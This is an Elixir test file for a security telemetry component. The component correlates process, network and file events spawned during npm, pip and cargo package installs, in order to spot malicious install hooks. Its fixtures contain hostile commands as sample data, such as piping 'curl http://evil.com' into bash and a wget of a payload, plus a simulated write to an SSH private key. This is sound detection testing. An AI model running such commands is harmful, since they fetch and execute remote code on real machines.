defmodule TamanduaServer.Telemetry.PackageInstallCorrelatorTest do
  use ExUnit.Case, async: false

  alias TamanduaServer.Telemetry.PackageInstallCorrelator

  setup do
    # Start the correlator GenServer
    {:ok, _pid} = start_supervised(PackageInstallCorrelator)
    :ok
  end

  describe "start_tracking/2" do
    test "stores package manager PID and start time in ETS" do
      agent_id = "test-agent-1"
      event = %{
        "type" => "process_creation",
        "timestamp" => "2026-04-04T12:00:00Z",
        "pid" => 1000,
        "parent_pid" => 500,
        "image" => "C:\\Program Files\\nodejs\\npm.exe",
        "command_line" => "npm install lodash",
        "agent_id" => agent_id,
        "environment" => %{
          "npm_package_name" => "lodash"
        }
      }

      assert :ok = PackageInstallCorrelator.start_tracking(agent_id, event)

      # Verify session was created
      session = PackageInstallCorrelator.get_install_events(agent_id, 1000)
      assert session != nil
      assert session.ecosystem == :npm
      assert session.package_name == "lodash"
    end

    test "detects npm package manager" do
      event = %{
        "type" => "process_creation",
        "pid" => 1001,
        "image" => "/usr/local/bin/npm",
        "agent_id" => "agent-2"
      }

      PackageInstallCorrelator.start_tracking("agent-2", event)
      session = PackageInstallCorrelator.get_install_events("agent-2", 1001)
      assert session.ecosystem == :npm
    end

    test "detects pip package manager" do
      event = %{
        "type" => "process_creation",
        "pid" => 1002,
        "image" => "/usr/bin/pip3",
        "agent_id" => "agent-3"
      }

      PackageInstallCorrelator.start_tracking("agent-3", event)
      session = PackageInstallCorrelator.get_install_events("agent-3", 1002)
      assert session.ecosystem == :pip
    end

    test "detects cargo package manager" do
      event = %{
        "type" => "process_creation",
        "pid" => 1003,
        "image" => "C:\\Users\\dev\\.cargo\\bin\\cargo.exe",
        "agent_id" => "agent-4"
      }

      PackageInstallCorrelator.start_tracking("agent-4", event)
      session = PackageInstallCorrelator.get_install_events("agent-4", 1003)
      assert session.ecosystem == :cargo
    end
  end

  describe "process_event/1" do
    test "adds child process event to tracked session" do
      agent_id = "agent-5"

      # Start tracking npm install
      parent_event = %{
        "type" => "process_creation",
        "pid" => 2000,
        "image" => "/usr/bin/npm",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:00Z"
      }
      PackageInstallCorrelator.start_tracking(agent_id, parent_event)

      # Child process spawned during install
      child_event = %{
        "type" => "process_creation",
        "pid" => 2001,
        "parent_pid" => 2000,
        "image" => "/bin/sh",
        "command_line" => "sh -c 'curl http://evil.com | bash'",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:05Z"
      }
      PackageInstallCorrelator.process_event(child_event)

      # Verify child event was captured
      session = PackageInstallCorrelator.get_install_events(agent_id, 2000)
      assert length(session.events) == 1
      assert hd(session.events)["pid"] == 2001
    end

    test "adds network connection from tracked child PID" do
      agent_id = "agent-6"

      parent_event = %{
        "type" => "process_creation",
        "pid" => 3000,
        "image" => "pip.exe",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:00Z"
      }
      PackageInstallCorrelator.start_tracking(agent_id, parent_event)

      # Child process
      child_event = %{
        "type" => "process_creation",
        "pid" => 3001,
        "parent_pid" => 3000,
        "image" => "python.exe",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:02Z"
      }
      PackageInstallCorrelator.process_event(child_event)

      # Network event from child
      network_event = %{
        "type" => "network_connection",
        "source_pid" => 3001,
        "destination_ip" => "185.234.219.47",
        "destination_port" => 443,
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:05Z"
      }
      PackageInstallCorrelator.process_event(network_event)

      session = PackageInstallCorrelator.get_install_events(agent_id, 3000)
      network_events = Enum.filter(session.events, &(&1["type"] == "network_connection"))
      assert length(network_events) == 1
    end

    test "adds file write from tracked child PID" do
      agent_id = "agent-7"

      parent_event = %{
        "type" => "process_creation",
        "pid" => 4000,
        "image" => "cargo.exe",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:00Z"
      }
      PackageInstallCorrelator.start_tracking(agent_id, parent_event)

      child_event = %{
        "type" => "process_creation",
        "pid" => 4001,
        "parent_pid" => 4000,
        "image" => "rustc.exe",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:02Z"
      }
      PackageInstallCorrelator.process_event(child_event)

      file_event = %{
        "type" => "file_write",
        "pid" => 4001,
        "file_path" => "C:\\Users\\dev\\.ssh\\id_rsa",
        "bytes_written" => 1024,
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:05Z"
      }
      PackageInstallCorrelator.process_event(file_event)

      session = PackageInstallCorrelator.get_install_events(agent_id, 4000)
      file_events = Enum.filter(session.events, &(&1["type"] == "file_write"))
      assert length(file_events) == 1
    end

    test "tracks nested child processes (grandchildren)" do
      agent_id = "agent-8"

      parent_event = %{
        "type" => "process_creation",
        "pid" => 5000,
        "image" => "npm",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:00Z"
      }
      PackageInstallCorrelator.start_tracking(agent_id, parent_event)

      # Child
      child_event = %{
        "type" => "process_creation",
        "pid" => 5001,
        "parent_pid" => 5000,
        "image" => "node",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:02Z"
      }
      PackageInstallCorrelator.process_event(child_event)

      # Grandchild
      grandchild_event = %{
        "type" => "process_creation",
        "pid" => 5002,
        "parent_pid" => 5001,
        "image" => "sh",
        "command_line" => "sh -c 'wget http://evil.com/payload'",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:04Z"
      }
      PackageInstallCorrelator.process_event(grandchild_event)

      session = PackageInstallCorrelator.get_install_events(agent_id, 5000)
      assert MapSet.member?(session.tracked_pids, 5001)
      assert MapSet.member?(session.tracked_pids, 5002)
      assert length(session.events) == 2
    end

    test "does not collect events outside 60-second window" do
      agent_id = "agent-9"

      parent_event = %{
        "type" => "process_creation",
        "pid" => 6000,
        "image" => "npm",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:00Z"
      }
      PackageInstallCorrelator.start_tracking(agent_id, parent_event)

      # Event within window
      child_event_1 = %{
        "type" => "process_creation",
        "pid" => 6001,
        "parent_pid" => 6000,
        "image" => "node",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:30Z"
      }
      PackageInstallCorrelator.process_event(child_event_1)

      # Event outside window (61 seconds later)
      child_event_2 = %{
        "type" => "process_creation",
        "pid" => 6002,
        "parent_pid" => 6000,
        "image" => "node",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:01:01Z"
      }
      PackageInstallCorrelator.process_event(child_event_2)

      session = PackageInstallCorrelator.get_install_events(agent_id, 6000)
      # Only the first child event should be captured
      assert length(session.events) == 1
      assert hd(session.events)["pid"] == 6001
    end
  end

  describe "stop_tracking/2" do
    test "returns all collected events and removes from ETS" do
      agent_id = "agent-10"

      parent_event = %{
        "type" => "process_creation",
        "pid" => 7000,
        "image" => "pip",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:00Z"
      }
      PackageInstallCorrelator.start_tracking(agent_id, parent_event)

      child_event = %{
        "type" => "process_creation",
        "pid" => 7001,
        "parent_pid" => 7000,
        "image" => "python",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:05Z"
      }
      PackageInstallCorrelator.process_event(child_event)

      # Stop tracking
      result = PackageInstallCorrelator.stop_tracking(agent_id, 7000)
      assert result.ecosystem == :pip
      assert length(result.events) == 1

      # Session should be removed
      assert PackageInstallCorrelator.get_install_events(agent_id, 7000) == nil
    end
  end

  describe "get_install_events/2" do
    test "returns events for active tracking session" do
      agent_id = "agent-11"

      parent_event = %{
        "type" => "process_creation",
        "pid" => 8000,
        "image" => "cargo",
        "agent_id" => agent_id,
        "timestamp" => "2026-04-04T12:00:00Z"
      }
      PackageInstallCorrelator.start_tracking(agent_id, parent_event)

      session = PackageInstallCorrelator.get_install_events(agent_id, 8000)
      assert session != nil
      assert session.ecosystem == :cargo
      assert session.events == []
    end

    test "returns nil for non-existent session" do
      result = PackageInstallCorrelator.get_install_events("unknown-agent", 9999)
      assert result == nil
    end
  end
end
